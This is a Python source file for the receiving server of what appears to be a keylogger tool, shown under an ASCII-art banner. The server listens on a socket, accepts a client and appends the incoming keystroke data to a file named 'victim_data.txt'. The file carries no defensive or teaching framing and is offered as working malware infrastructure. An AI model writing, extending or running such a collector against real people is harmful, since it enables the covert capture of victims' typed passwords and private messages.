import socket

class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server = None
        self.client_sock = None
        self.client_add = None
        self.file = "./victim_data.txt"

    def start_socket(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((self.ip, self.port))
        except socket.error as err:
            print(f"socket creation error: {err}")

    def connect(self):
        self.start_socket()
        try:
            self.server.listen(5)
            self.client_sock, self.client_add = self.server.accept()
            print(f"client connected successfully from ip: {self.client_add[0]} and port: {self.client_add[1]}")
        except socket.error as err:
            print(f"client connection error: {err}")

    def to_file(self, keys):
        if keys:
            with open(self.file, 'a') as f:
                f.write(keys)

    def data(self):
        self.connect()
        try:
            while True:
                keys = self.client_sock.recv(1024).decode()
                if keys:
                    self.to_file(keys)
                else:
                    break
        except socket.error as err:
            print(f"receiving data error: {err}")
        finally:
            if self.client_sock:
                self.client_sock.close()
            if self.server:
                self.server.close()

if __name__ == "__main__":
    print("\033[91m" + r'''
                           
                           
 (   (  (  (  (     ) (    
 )\  )\ )\ )\))( ( /( )(   
((_)((_|(_|(_))\ )(_)|()\  
\ \ / / (_)(()(_|(_)_ ((_) 
 \ V /  | / _` |/ _` | '_| 
  \_/   |_\__, |\__,_|_|   
          |___/                               
''' + "\033[0m")
    Ser = Server("server_ip", "server port")
    Ser.data()
